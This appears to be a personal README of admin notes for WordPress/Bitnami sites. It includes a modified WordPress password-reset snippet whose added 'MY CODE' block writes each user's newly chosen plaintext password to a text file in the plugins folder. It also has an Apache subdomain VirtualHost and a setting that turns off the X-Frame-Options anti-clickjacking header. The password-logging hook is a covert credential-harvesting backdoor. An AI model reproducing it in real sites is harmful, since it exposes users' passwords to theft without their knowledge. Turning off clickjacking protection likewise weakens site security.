# MREG
Backups and How Tos for MREG sites


# For plaintext passwords
* @param WP_User|WP_Error $user   WP_User object if the login and reset key match. WP_Error object otherwise
*/
	do_action( 'validate_password_reset', $errors, $user );
#FIRES ON RESET PAGE LOAD -MORGAN
	
	if ( ( ! $errors->get_error_code() ) && isset( $_POST['pass1'] ) && !empty( $_POST['pass1'] ) ) {
		reset_password($user, $_POST['pass1']);
#FIRES AFTER NEW PASSWORD RESET ACEPTED -MORGAN
#BEGINING OF MY CODE -MORGAN
		$my_file = 'C:\Bitnami\wordpress-4.9.1-0\apps\wordpress\htdocs\wp-content\plugins\text.txt';	
		$handle = fopen($my_file, 'a') or die('Cannot open file:  '.$my_file);	
		$myvariable1 = "Hello World1";
		$myvariable2 = "Hello World2";
		$myvariable3 = "$myvariable1, $myvariable2";
		$myvariable4 = $_POST['pass1'];
		fwrite($handle, "$myvariable4");
#END OF MY CODE -MORGAN


#For emby user create 
For iredmail
Open ports at cloud level
For subdoains
Edit /opt/bitnami/acpache/conf/bitnami/bitnami.conf
<VirtualHost _default_:80>
  DocumentRoot "/opt/bitnami/apps/wordpress/htdocs/kexow"
  ServerName kexow.kexow.com
  
      <Directory "/opt/bitnami/apps/wordpress/htdocs/kexow">
        Options Includes FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>
</VirtualHost>
For to remove x frame same origin 
// X-Frame-Options HTTP header value sent to prevent from Clickjacking.
// Possible values: sameorigin|deny|allow-from <uri>.
// Set to false in order to disable sending the header.
$config['x_frame_options'] = false;
